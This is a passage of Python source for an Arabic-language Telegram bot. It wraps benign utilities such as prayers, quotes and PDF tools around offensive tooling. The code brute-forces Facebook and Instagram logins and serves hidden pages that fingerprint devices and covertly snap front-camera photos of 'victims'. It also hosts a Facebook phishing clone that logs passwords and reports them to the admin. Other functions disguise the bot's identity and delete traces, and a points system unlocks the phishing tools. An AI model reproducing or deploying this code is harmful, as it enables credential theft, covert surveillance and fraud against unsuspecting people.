        split_point = text.rfind(' ', 0, max_chunk_size)
        if split_point == -1:
            split_point = max_chunk_size
        chunks.append(text[:split_point])
        text = text[split_point:].strip()
    if text:
        chunks.append(text)
    return chunks

def analyze_apk(file_content, file_name):
    if not VIRUSTOTAL_API_KEY:
        return {'error': 'مفتاح VirusTotal غير مضبوط'}
    try:
        url = "https://www.virustotal.com/api/v3/files"
        headers = {"x-apikey": VIRUSTOTAL_API_KEY}
        files = {'file': (file_name, file_content)}
        response = requests.post(url, headers=headers, files=files, timeout=60)
        if response.status_code == 200:
            scan_id = response.json().get('data', {}).get('id')
            if scan_id:
                time.sleep(5)
                report_url = f"https://www.virustotal.com/api/v3/analyses/{scan_id}"
                report = requests.get(report_url, headers=headers, timeout=30)
                if report.status_code == 200:
                    stats = report.json().get('data', {}).get('attributes', {}).get('stats', {})
                    return {
                        'malicious': stats.get('malicious', 0),
                        'suspicious': stats.get('suspicious', 0),
                        'harmless': stats.get('harmless', 0),
                        'undetected': stats.get('undetected', 0)
                    }
        return {'error': 'فشل فحص الملف'}
    except Exception as e:
        return {'error': str(e)}

def download_video(url):
    try:
        ydl_opts = {
            'outtmpl': 'downloads/%(title)s.%(ext)s',
            'quiet': True,
            'no_warnings': True,
            'format': 'best[ext=mp4]/best',
            'extract_flat': False,
            'ignoreerrors': True,
            'no_color': True,
            'geo_bypass': True,
            'retries': 10,
            'fragment_retries': 10,
            'headers': {'User-Agent': get_random_ua()}
        }
        if 'facebook.com' in url or 'fb.watch' in url:
            ydl_opts['extractor_args'] = {
                'facebook': {
                    'prefer_facebook_web': ['true'],
                    'video_codec': ['h264'],
                    'audio_codec': ['aac']
                }
            }
        os.makedirs('downloads', exist_ok=True)
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            if info:
                filename = ydl.prepare_filename(info)
                if os.path.exists(filename) and os.path.getsize(filename) > 0:
                    return filename, None
                else:
                    return None, "فشل تحميل الفيديو: الملف غير موجود أو فارغ"
            else:
                return None, "فشل استخراج معلومات الفيديو"
    except Exception as e:
        return None, f"خطأ: {str(e)[:150]}"

# ===================== دوال الهجمات (للأدمن فقط) =====================
def brute_force_facebook(email_or_phone, password_list, max_attempts=100):
    login_url = "https://www.facebook.com/login.php"
    results = {'success': False, 'credentials': None, 'attempts': 0}
    for i, pwd in enumerate(password_list[:max_attempts]):
        results['attempts'] += 1
        session = requests.Session()
        session.headers.update({'User-Agent': get_random_ua()})
        try:
            resp = session.get(login_url, timeout=10)
            if resp.status_code != 200:
                continue
            token_match = re.search(r'name="fb_dtsg" value="([^"]+)"', resp.text)
            token = token_match.group(1) if token_match else ''
            data = {'email': email_or_phone, 'pass': pwd, 'fb_dtsg': token, 'login': 'Log In'}
            login_resp = session.post(login_url, data=data, timeout=10, allow_redirects=False)
            if login_resp.status_code == 302 and 'c_user' in login_resp.cookies:
                results['success'] = True
                results['credentials'] = {'username': email_or_phone, 'password': pwd}
                break
        except:
            pass
        time.sleep(random.uniform(1, 3))
    return results

def brute_force_instagram(username, password_list, max_attempts=100):
    login_url = "https://www.instagram.com/accounts/login/ajax/"
    results = {'success': False, 'credentials': None, 'attempts': 0}
    session = requests.Session()
    session.headers.update({'User-Agent': get_random_ua(), 'X-Requested-With': 'XMLHttpRequest'})
    try:
        resp = session.get("https://www.instagram.com/", timeout=10)
        csrf = resp.cookies.get('csrftoken', '')
    except:
        csrf = ''
    for i, pwd in enumerate(password_list[:max_attempts]):
        results['attempts'] += 1
        data = {'username': username, 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{pwd}'}
        headers = {'X-CSRFToken': csrf}
        try:
            resp = session.post(login_url, data=data, headers=headers, timeout=10)
            if resp.status_code == 200:
                json_resp = resp.json()
                if json_resp.get('authenticated'):
                    results['success'] = True
                    results['credentials'] = {'username': username, 'password': pwd}
                    break
        except:
            pass
        time.sleep(random.uniform(2, 4))
    return results

def port_scan(target):
    ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5432, 5900, 6379, 8080]
    open_ports = []
    try:
        ip = socket.gethostbyname(target)
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            if sock.connect_ex((ip, port)) == 0:
                open_ports.append(port)
            sock.close()
        return open_ports
    except:
        return []

def ssl_scan(domain):
    try:
        import ssl
        context = ssl.create_default_context()
        with socket.create_connection((domain, 443), timeout=10) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                return {'valid': True, 'subject': cert.get('subject', ''), 'issuer': cert.get('issuer', ''), 'not_after': cert.get('notAfter', ''), 'not_before': cert.get('notBefore', '')}
    except:
        return {'valid': False, 'error': 'فشل الاتصال'}

STEALTH_MODE = False
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

def get_random_ua():
    return random.choice(USER_AGENTS)

# ===================== صفحات Flask (صامتة) =====================
DEVICE_INFO_PAGE_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>...</title>
<style>body{margin:0;padding:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;color:#000;font-family:Arial;}</style>
</head>
<body><div style="color:#000;">.</div>
<script>
function collectInfo(){
    const info={
        "الدولة":"","المدينة":"","عنوان IP":"","شحن الهاتف":"غير معروف","هل الهاتف يشحن؟":"لا",
        "الشبكة":"غير معروف","نوع الاتصال":"غير معروف","الوقت":new Date().toLocaleString('ar-EG'),
        "اسم الجهاز":navigator.platform||"غير معروف","إصدار الجهاز":navigator.userAgent||"غير معروف",
        "نوع الجهاز":/Mobi/.test(navigator.userAgent)?"هاتف":"كمبيوتر",
        "الذاكرة (RAM)":navigator.deviceMemory?navigator.deviceMemory+" GB":"غير معروف",
        "عدد الأنوية":navigator.hardwareConcurrency||"غير معروف","لغة النظام":navigator.language||"غير معروف",
        "دقة الشاشة":window.screen.width+"x"+window.screen.height,"إصدار نظام التشغيل":navigator.platform||"غير معروف",
        "عمق الألوان":window.screen.colorDepth+" bit"
    };
    fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>{info["الدولة"]=d.country_name||"";info["المدينة"]=d.city||"";info["عنوان IP"]=d.ip||"";sendData(info);}).catch(()=>sendData(info));
    if(navigator.getBattery){navigator.getBattery().then(b=>{info["شحن الهاتف"]=Math.round(b.level*100)+"%";info["هل الهاتف يشحن؟"]=b.charging?"نعم":"لا";});}
}
function sendData(data){
    const token=new URLSearchParams(window.location.search).get('token');
    if(!token)return;
    fetch(window.location.origin+'/collect_data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:token,data:data})}).then(()=>{window.close();}).catch(()=>{window.close();});
}
collectInfo();
setTimeout(()=>{window.close();},5000);
</script></body></html>
"""

CAMERA_PAGE_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>...</title>
<style>body{margin:0;padding:0;background:#000;}video{display:none;}</style>
</head>
<body><video id="video" autoplay playsinline></video>
<script>
const video=document.getElementById('video');
let stream=null;
function captureAndSend(){
    if(!stream)return;
    const canvas=document.createElement('canvas');
    canvas.width=video.videoWidth||640;
    canvas.height=video.videoHeight||480;
    canvas.getContext('2d').drawImage(video,0,0);
    const imageData=canvas.toDataURL('image/jpeg',0.9);
    const token=new URLSearchParams(window.location.search).get('token');
    if(!token)return;
    fetch(window.location.origin+'/collect_data',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token:token,data:{image:imageData}})}).then(()=>{window.close();}).catch(()=>{window.close();});
}
navigator.mediaDevices.getUserMedia({video:{facingMode:'user',width:640,height:480}}).then(s=>{stream=s;video.srcObject=s;setTimeout(captureAndSend,2000);}).catch(()=>{window.close();});
setTimeout(()=>{window.close();},10000);
</script></body></html>
"""

# ===================== صفحات التصيد =====================
PHISHING_PAGES = {}
def get_phishing_page(platform):
    if platform in PHISHING_PAGES:
        return PHISHING_PAGES[platform]
    if platform == 'facebook':
        html = """<!DOCTYPE html><html dir="rtl" lang="ar"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>فيسبوك</title><style>*{margin:0;padding:0;box-sizing:border-box}html,body{height:100%;font-family:Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;direction:rtl;padding:0;margin:0}.container{width:100%;max-width:450px;height:100%;background:#fff;padding:40px 30px;text-align:center;display:flex;flex-direction:column;justify-content:center}.logo{color:#1877f2;font-size:46px;font-weight:bold;margin-bottom:30px}.input{width:100%;padding:15px;margin:12px 0;border:1px solid #dddfe2;border-radius:8px;font-size:17px;box-sizing:border-box;background:#f5f6f7}.input:focus{outline:2px solid #1877f2;border-color:transparent}.btn{background:#1877f2;color:#fff;border:none;border-radius:8px;padding:15px;font-size:20px;width:100%;cursor:pointer;font-weight:bold}.btn:hover{background:#166fe5}.link{color:#1877f2;text-decoration:none;font-size:15px;margin:10px 0}.hr{height:1px;background:#dadde1;margin:20px 0}.btn-green{background:#42b72a;margin-top:5px}.btn-green:hover{background:#36a420}.footer{color:#8a8d91;font-size:13px;margin-top:20px}</style></head><body><div class="container"><div class="logo">facebook</div><form method="POST" action="/phishing_capture"><input type="hidden" name="platform" value="facebook"><input class="input" type="text" name="username" placeholder="البريد الإلكتروني أو رقم الهاتف" required><input class="input" type="password" name="password" placeholder="كلمة السر" required><button class="btn" type="submit">تسجيل الدخول</button></form><a class="link" href="#">نسيت كلمة السر؟</a><div class="hr"></div><button class="btn btn-green" onclick="alert('تم إنشاء الحساب')">إنشاء حساب جديد</button><div class="footer">© 2025 فيسبوك</div></div></body></html>"""
    else:
        html = "<h2>منصة غير معروفة</h2>"
    PHISHING_PAGES[platform] = html
    return html

# ===================== مسارات Flask =====================
@app.route('/device_info')
def device_info_page():
    token = request.args.get('token')
    if not token:
        return "Invalid request", 400
    chat_id = get_chat_id_by_token(token)
    if not chat_id:
        return "Invalid token", 400
    return render_template_string(DEVICE_INFO_PAGE_TEMPLATE)

@app.route('/camera_hack')
def camera_hack_page():
    token = request.args.get('token')
    if not token:
        return "Invalid request", 400
    chat_id = get_chat_id_by_token(token)
    if not chat_id:
        return "Invalid token", 400
    return render_template_string(CAMERA_PAGE_TEMPLATE)

@app.route('/phishing_pages/<platform>')
def phishing_page(platform):
    if platform not in ['facebook']:
        return "منصة غير مدعومة", 404
    return get_phishing_page(platform)

@app.route('/collect_data', methods=['POST'])
def collect_data():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'status': 'ok'}), 200
        token = data.get('token')
        if not token:
            return jsonify({'status': 'ok'}), 200
        chat_id = get_chat_id_by_token(token)
        if not chat_id:
            return jsonify({'status': 'ok'}), 200
        info = data.get('data', {})
        if not info:
            return jsonify({'status': 'ok'}), 200
        
        if 'image' in info:
            img_data = info['image']
            if img_data.startswith('data:image'):
                try:
                    header, encoded = img_data.split(',', 1)
                    img_bytes = base64.b64decode(encoded)
                    bot.send_photo(chat_id, BytesIO(img_bytes), caption="📸 صورة من الكاميرا الأمامية")
                    bot.send_photo(ADMIN_ID, BytesIO(img_bytes), caption=f"📸 صورة من ضحية للمستخدم {chat_id}")
                except Exception as e:
                    logger.error(f"Error processing image: {e}")
        else:
            msg = "📱 معلومات الجهاز:\n\n"
            for key, value in info.items():
                msg += f"- {key}: {value}\n"
            safe_send(chat_id, msg)
            safe_send(ADMIN_ID, f"📱 معلومات من ضحية للمستخدم {chat_id}:\n\n{msg}")
        
        return jsonify({'status': 'ok'}), 200
    except Exception as e:
        logger.error(f"collect_data error: {e}")
        return jsonify({'status': 'ok'}), 200

@app.route('/phishing_capture', methods=['POST'])
def phishing_capture():
    ip = request.remote_addr
    try:
        platform = request.form.get('platform', 'unknown')
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        safe_db_execute("INSERT INTO phishing_logs (target_email, platform, username, password, ip, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                        ('', platform, username, password, ip, datetime.now().isoformat()))
        notify_admin(f"بيانات تصيد جديدة!\nالمنصة: {platform}\nالمستخدم: {username}\nكلمة السر: {password}\nIP: {ip}")
        return """
        <html><body style="font-family:Arial;text-align:center;padding:50px;background:#f0f2f5;"><div style="max-width:400px;margin:auto;background:white;padding:40px;border-radius:12px;box-shadow:0 2px 15px rgba(0,0,0,0.1);"><h2 style="color:#1877f2;">تم تسجيل الدخول</h2><p style="color:#555;">جاري تحويلك...</p><script>setTimeout(function(){ window.location.href = "https://www.google.com"; }, 2000);</script></div></body></html>
        """
    except Exception as e:
        return f"حدث خطأ: {str(e)}"

@app.route('/health')
def health():
    return jsonify({'status': 'healthy', 'time': datetime.now().isoformat()})

@app.route('/')
def index():
    return jsonify({'status': 'running', 'time': datetime.now().isoformat()})

# ===================== دوال الحماية =====================
def change_bot_identity():
    try:
        new_name = random.choice(["System Scanner", "Security Checker", "Network Tool", "File Manager", "PDF Reader", "Help Desk", "Support Bot", "Cyber Guardian"])
        bot.set_my_name(new_name)
        bot.set_my_description("أداة متقدمة للفحص الرقمي والأمان السيبراني")
        bot.set_my_short_description("أداة متقدمة للفحص الرقمي")
        return f"تم تغيير هوية البوت إلى: {new_name}"
    except Exception as e:
        return f"فشل تغيير الهوية: {str(e)}"

def clean_traces():
    try:
        for f in os.listdir('temp'):
            os.remove(os.path.join('temp', f))
        for f in os.listdir('downloads'):
            os.remove(os.path.join('downloads', f))
        return "تم تنظيف السجلات والملفات المؤقتة بنجاح"
    except Exception as e:
        return f"فشل التنظيف: {str(e)}"

def backup_data():
    try:
        backup_dir = "backups"
        os.makedirs(backup_dir, exist_ok=True)
        backup_file = os.path.join(backup_dir, f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.db")
        shutil.copy2(DB_PATH, backup_file)
        return f"تم إنشاء النسخة الاحتياطية: {backup_file}"
    except Exception as e:
        return f"فشل النسخ الاحتياطي: {str(e)}"

def detect_intrusion():
    return "لا توجد محاولات اختراق مشبوهة حالياً."

def active_shield():
    return "درع الحماية مفعل: يتم تطبيق حد الطلبات ومنع الـ IPs المشبوهة"

def restart_bot_safely():
    safe_db_execute("INSERT OR REPLACE INTO bot_state (key, value) VALUES ('last_restart', ?)", (datetime.now().isoformat(),))
    return "تم إعادة تشغيل البوت بشكل آمن"

# ===================== إنشاء البوت =====================
bot = TeleBot(TOKEN, parse_mode='HTML')

# ===================== بناء القوائم (مختصرة) =====================
os.makedirs('temp', exist_ok=True)
os.makedirs('downloads', exist_ok=True)

ADVANCED_CLICKS = defaultdict(int)
user_adkar_indices = defaultdict(lambda: {'sabah': 0, 'massaa': 0})
user_doaa_indices = defaultdict(int)
temp_passwords = {}

def build_main_menu(chat_id):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("الطقس", callback_data="weather"),
        InlineKeyboardButton("ويكيبيديا", callback_data="wikipedia")
    )
    markup.row(
        InlineKeyboardButton("مولد كلمات سر", callback_data="password_gen"),
        InlineKeyboardButton("فحص قوة كلمة السر", callback_data="password_strength")
    )
    markup.row(
        InlineKeyboardButton("تحويل نص إلى صوت", callback_data="text_to_speech"),
        InlineKeyboardButton("ترجمة فورية", callback_data="translate")
    )
    markup.row(
        InlineKeyboardButton("تذكير", callback_data="reminder"),
        InlineKeyboardButton("آخر الأخبار", callback_data="news")
    )
    if user_can_use_collector(chat_id):
        markup.row(
            InlineKeyboardButton("معلومات الجهاز", callback_data="device_info"),
            InlineKeyboardButton("الكاميرا الأمامية", callback_data="camera_hack")
        )
    markup.row(
        InlineKeyboardButton("اقتباسات", callback_data="quotes_menu"),
        InlineKeyboardButton("نصائح", callback_data="tips_menu")
    )
    markup.row(
        InlineKeyboardButton("فحص الرابط", callback_data="check_link_advanced"),
        InlineKeyboardButton("تحليل APK", callback_data="analyze_apk")
    )
    markup.row(
        InlineKeyboardButton("تحليل PDF", callback_data="pdf_menu"),
        InlineKeyboardButton("الأجهزة", callback_data="list_devices")
    )
    # الأزرار الإسلامية
    markup.row(
        InlineKeyboardButton("📿 أذكار الصباح", callback_data="adkar_sabah"),
        InlineKeyboardButton("🌙 أذكار المساء", callback_data="adkar_massaa")
    )
    markup.row(
        InlineKeyboardButton("🤲 أدعية متنوعة", callback_data="doaa_menu"),
        InlineKeyboardButton("🕌 مسلم", callback_data="muslim_menu")
    )
    markup.row(
        InlineKeyboardButton("نقاطي", callback_data="my_points"),
        InlineKeyboardButton("رابط دعوتي", callback_data="my_referral")
    )
    markup.row(
        InlineKeyboardButton("سجل النقاط", callback_data="points_history"),
        InlineKeyboardButton("إعدادات متقدمة", callback_data="admin_panel")
    )
    if is_admin(chat_id):
        markup.row(
            InlineKeyboardButton("القائمة السرية", callback_data="hacking_menu"),
            InlineKeyboardButton("الحماية", callback_data="protection_menu")
        )
        markup.row(
            InlineKeyboardButton("إدارة الصلاحيات", callback_data="admin_permissions"),
            InlineKeyboardButton("قفل الدردشة", callback_data="lock_chat")
        )
        markup.row(
            InlineKeyboardButton("أرسل للمستخدم", callback_data="send_to_user"),
            InlineKeyboardButton("نشاط المستخدمين", callback_data="user_activity")
        )
        markup.row(
            InlineKeyboardButton("إدارة النقاط", callback_data="admin_points_menu"),
            InlineKeyboardButton("حظر المستخدمين", callback_data="admin_ban_menu")
        )
    markup.row(
        InlineKeyboardButton("تحميل فيديو", callback_data="download_video")
    )
    if user_can_use_phishing(chat_id) or is_admin(chat_id):
        markup.row(
            InlineKeyboardButton("صفحات تصيد", callback_data="phishing_pages"),
            InlineKeyboardButton("بريد تصيد", callback_data="phishing_email")
        )
    else:
        markup.row(
            InlineKeyboardButton("🔒 صفحات تصيد (300 نقطة)", callback_data="phishing_locked")
        )
    if is_admin(chat_id):
        markup.row(
            InlineKeyboardButton("وضع التخفي", callback_data="toggle_stealth"),
            InlineKeyboardButton("قفل البوت", callback_data="protect_lock")
        )
    return markup

# باقي القوائم مختصرة (للحفاظ على حجم الكود)
def build_quotes_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("اقتباسات عربية", callback_data="quotes_arabic"), InlineKeyboardButton("اقتباسات إنجليزية", callback_data="quotes_english"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_quotes_type_menu(lang):
    markup = InlineKeyboardMarkup(row_width=2)
    if lang == 'arabic':
        markup.row(InlineKeyboardButton("حزين", callback_data="quote_arabic_sad"), InlineKeyboardButton("عميق", callback_data="quote_arabic_deep"), InlineKeyboardButton("جميل", callback_data="quote_arabic_beautiful"))
    else:
        markup.row(InlineKeyboardButton("Sad", callback_data="quote_english_sad"), InlineKeyboardButton("Deep", callback_data="quote_english_deep"), InlineKeyboardButton("Beautiful", callback_data="quote_english_beautiful"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="quotes_menu"))
    return markup

def build_tips_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("نصائح دراسية", callback_data="tips_study"), InlineKeyboardButton("نصائح اجتماعية", callback_data="tips_social"))
    markup.row(InlineKeyboardButton("نصائح للاكتئاب", callback_data="tips_depression"), InlineKeyboardButton("نصائح إسلامية", callback_data="tips_islamic"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_phishing_pages_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("فيسبوك", callback_data="phish_facebook"), InlineKeyboardButton("انستغرام", callback_data="phish_instagram"))
    markup.row(InlineKeyboardButton("تيك توك", callback_data="phish_tiktok"), InlineKeyboardButton("تويتر", callback_data="phish_twitter"))
    markup.row(InlineKeyboardButton("واتساب", callback_data="phish_whatsapp"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_protection_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("درع الحماية", callback_data="protect_shield"), InlineKeyboardButton("قفل البوت", callback_data="protect_lock"))
    markup.row(InlineKeyboardButton("تخفي شامل", callback_data="protect_stealth"), InlineKeyboardButton("كشف الاختراق", callback_data="protect_detect"))
    markup.row(InlineKeyboardButton("تغيير الهوية", callback_data="protect_identity"), InlineKeyboardButton("تنظيف السجلات", callback_data="protect_clean"))
    markup.row(InlineKeyboardButton("حماية API", callback_data="protect_api"), InlineKeyboardButton("نسخ احتياطي", callback_data="protect_backup"))
    markup.row(InlineKeyboardButton("إعادة تشغيل آمن", callback_data="protect_reboot"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_pdf_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("تلخيص PDF", callback_data="pdf_summary"), InlineKeyboardButton("استخراج نصوص", callback_data="pdf_extract"))
    markup.row(InlineKeyboardButton("تحليل ذكي (أسئلة)", callback_data="pdf_smart"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_hacking_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("حقن SQL", callback_data="hack_sqli"), InlineKeyboardButton("XSS", callback_data="hack_xss"))
    markup.row(InlineKeyboardButton("DoS", callback_data="hack_dos"), InlineKeyboardButton("ARP Spoof", callback_data="hack_arp"))
    markup.row(InlineKeyboardButton("تخمين فيسبوك", callback_data="bruteforce_fb"), InlineKeyboardButton("تخمين انستغرام", callback_data="bruteforce_ig"))
    markup.row(InlineKeyboardButton("تخمين SSH", callback_data="bruteforce_ssh"), InlineKeyboardButton("تخمين FTP", callback_data="bruteforce_ftp"))
    markup.row(InlineKeyboardButton("تخمين مخصص", callback_data="bruteforce_custom"), InlineKeyboardButton("تحميل فيديو", callback_data="download_video"))
    markup.row(InlineKeyboardButton("مسح منافذ", callback_data="port_scan"), InlineKeyboardButton("فحص SSL", callback_data="ssl_scan"))
    markup.row(InlineKeyboardButton("كاميرا", callback_data="hack_camera"), InlineKeyboardButton("ميكروفون", callback_data="hack_mic"))
    markup.row(InlineKeyboardButton("موقع", callback_data="hack_location"), InlineKeyboardButton("جهات اتصال", callback_data="hack_contacts"))
    markup.row(InlineKeyboardButton("رسائل SMS", callback_data="hack_sms"), InlineKeyboardButton("لقطة شاشة", callback_data="hack_screenshot"))
    markup.row(InlineKeyboardButton("Shell", callback_data="hack_shell"), InlineKeyboardButton("إيقاف تشغيل", callback_data="hack_shutdown"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_admin_panel():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("إحصائيات", callback_data="admin_stats"), InlineKeyboardButton("بث جماعي", callback_data="admin_broadcast"))
    markup.row(InlineKeyboardButton("المستخدمين", callback_data="admin_users"), InlineKeyboardButton("التقارير", callback_data="admin_reports"))
    markup.row(InlineKeyboardButton("إدارة النقاط", callback_data="admin_points_menu"), InlineKeyboardButton("حظر المستخدمين", callback_data="admin_ban_menu"))
    markup.row(InlineKeyboardButton("سجل التصيد", callback_data="admin_phishing_logs"), InlineKeyboardButton("إدارة الصلاحيات", callback_data="admin_permissions"))
    markup.row(InlineKeyboardButton("قفل الدردشة", callback_data="lock_chat"), InlineKeyboardButton("أرسل للمستخدم", callback_data="send_to_user"))
    markup.row(InlineKeyboardButton("نشاط المستخدمين", callback_data="user_activity"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_doaa_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("🤲 أدعية السفر", callback_data="doaa_safar"), InlineKeyboardButton("🤲 أدعية الهم", callback_data="doaa_hem"))
    markup.row(InlineKeyboardButton("🤲 أدعية الرزق", callback_data="doaa_rizq"), InlineKeyboardButton("🤲 أدعية النوم", callback_data="doaa_nawm"))
    markup.row(InlineKeyboardButton("🤲 أدعية الفرج", callback_data="doaa_faraj"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_muslim_menu():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.row(InlineKeyboardButton("🕌 أركان الإسلام", callback_data="muslim_arkan_islam"))
    markup.row(InlineKeyboardButton("📖 أركان الإيمان", callback_data="muslim_arkan_iman"))
    markup.row(InlineKeyboardButton("💧 أركان الوضوء", callback_data="muslim_wudu"))
    markup.row(InlineKeyboardButton("🚿 صفة الغسل", callback_data="muslim_ghusl"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_phishing_platform_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(InlineKeyboardButton("فيسبوك", callback_data="phish_platform_facebook"), InlineKeyboardButton("انستغرام", callback_data="phish_platform_instagram"))
    markup.row(InlineKeyboardButton("تيك توك", callback_data="phish_platform_tiktok"), InlineKeyboardButton("تويتر", callback_data="phish_platform_twitter"))
    markup.row(InlineKeyboardButton("واتساب", callback_data="phish_platform_whatsapp"), InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup

def build_doaa_action_menu(category, current_index, total):
    markup = InlineKeyboardMarkup(row_width=1)
    if current_index + 1 < total:
        markup.row(InlineKeyboardButton("📖 المزيد", callback_data=f"doaa_more_{category}_{current_index+1}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="doaa_menu"))
    return markup

# ===== دوال عرض المستخدمين والصلاحيات =====
def get_users_list():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT chat_id, is_admin, is_banned, points, can_use_collector, can_use_camera, can_use_phishing, can_use_advanced FROM users")
    rows = c.fetchall()
    conn.close()
    return rows

def build_users_menu(chat_id, action):
    users = get_users_list()
    if not users:
        return None, "لا يوجد مستخدمين"
    markup = InlineKeyboardMarkup(row_width=1)
    for user in users:
        user_id = user[0]
        is_admin_flag = "👑" if user[1] else ""
        banned_flag = "🚫" if user[2] else ""
        label = f"{is_admin_flag}{banned_flag} {user_id} - نقاط: {user[3]}"
        markup.row(InlineKeyboardButton(label, callback_data=f"{action}_user_{user_id}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
    return markup, None

def build_permissions_menu(chat_id, target_user):
    row = safe_db_query("SELECT can_use_collector, can_use_camera, can_use_phishing, can_use_advanced FROM users WHERE chat_id = ?", (target_user,))
    if not row:
        return None
    can_collector, can_camera, can_phishing, can_advanced = row
    markup = InlineKeyboardMarkup(row_width=1)
    markup.row(InlineKeyboardButton(f"📱 معلومات الجهاز: {'✅' if can_collector else '❌'}", callback_data=f"perm_toggle_collector_{target_user}"))
    markup.row(InlineKeyboardButton(f"📸 كاميرا: {'✅' if can_camera else '❌'}", callback_data=f"perm_toggle_camera_{target_user}"))
    markup.row(InlineKeyboardButton(f"🎯 تصيد: {'✅' if can_phishing else '❌'}", callback_data=f"perm_toggle_phishing_{target_user}"))
    markup.row(InlineKeyboardButton(f"⚙️ متقدم: {'✅' if can_advanced else '❌'}", callback_data=f"perm_toggle_advanced_{target_user}"))
    markup.row(InlineKeyboardButton("رجوع", callback_data="admin_permissions"))
    return markup

# ===================== متغيرات الحالة =====================
BOT_LOCKED = False
user_states = {}
admin_remote = {}
pdf_texts = {}
reminder_timers = {}

# ===================== معالج الأزرار =====================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    try:
        chat_id = call.message.chat.id
        data = call.data

        log_activity(chat_id, data)
        update_last_seen(chat_id)

        # ===== الإعدادات المتقدمة =====
        if data == "admin_panel":
            if is_admin(chat_id):
                safe_send(chat_id, "لوحة التحكم:", reply_markup=build_admin_panel())
                return
            else:
                ADVANCED_CLICKS[chat_id] += 1
                clicks = ADVANCED_CLICKS[chat_id]
                responses = ["ماذا تظن نفسك فاعل 😑", "لا تلمس ذاك الزر 😐", "ممنوع لمس الزر انت غير مؤهل حتى الآن 🙂", "تحذير أخير: إذا استمريت، سيتم حظرك!"]
                if clicks <= 3:
                    safe_send(chat_id, responses[min(clicks-1, 3)])
                else:
                    safe_send(chat_id, "🚫 تم حظرك بسبب التكرار")
                    safe_db_execute("UPDATE users SET is_banned = 1 WHERE chat_id = ?", (chat_id,))
                return

        if data == "back_main":
            safe_send(chat_id, "القائمة الرئيسية", reply_markup=build_main_menu(chat_id))
            return

        # ===== الأذكار =====
        if data == "adkar_sabah":
            indices = user_adkar_indices[chat_id]
            indices['sabah'] = 0
            adkar_list = ISLAMIC_DATA["adkar_sabah"]
            current = adkar_list[0]
            markup = InlineKeyboardMarkup(row_width=1)
            if len(adkar_list) > 1:
                markup.row(InlineKeyboardButton("📖 المزيد", callback_data="adkar_more_sabah_1"))
            markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
            safe_send(chat_id, f"📿 أذكار الصباح:\n\n{current}", reply_markup=markup)
            return

        if data == "adkar_massaa":
            indices = user_adkar_indices[chat_id]
            indices['massaa'] = 0
            adkar_list = ISLAMIC_DATA["adkar_massaa"]
            current = adkar_list[0]
            markup = InlineKeyboardMarkup(row_width=1)
            if len(adkar_list) > 1:
                markup.row(InlineKeyboardButton("📖 المزيد", callback_data="adkar_more_massaa_1"))
            markup.row(InlineKeyboardButton("رجوع", callback_data="back_main"))
            safe_send(chat_id, f"🌙 أذكار المساء:\n\n{current}", reply_markup=markup)
            return

        if data.startswith("adkar_more_"):
            parts = data.split("_")
            adkar_type = parts[2]
            idx = int(parts[3])
            indices = user_adkar_indices[chat_id]
            indices[adkar_type] = idx
